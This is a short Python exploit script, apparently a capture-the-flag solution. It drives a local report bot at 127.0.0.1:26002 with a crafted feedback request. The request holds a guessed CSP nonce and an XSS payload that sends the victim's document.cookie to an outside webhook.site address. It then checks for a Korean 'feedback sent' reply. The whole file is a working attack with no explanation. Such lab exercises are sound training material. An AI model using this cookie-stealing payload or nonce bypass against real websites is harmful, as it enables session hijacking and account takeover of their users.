from urllib.parse import urlencode
from base64 import b64encode
from requests import get

report_baseurl = 'http://127.0.0.1:26002'
webhook_url = 'https://webhook.site/eb627e26-0992-4fde-a6f5-6e747025e179'

params = {
        'secret_key1': '1',
        'secret_key2': '%%c%',
}

payload = f"""<script nonce="MSVjJXM=">window.location.href='{webhook_url}?c='+document.cookie;</script>"""

params['payloads'] = payload

res = get(report_baseurl, params={'feedback':urlencode(params)})

if res.text.find("피드백 전송 완료") != -1:
    print("report bot calling success.")
else:
    print("reporting error.")
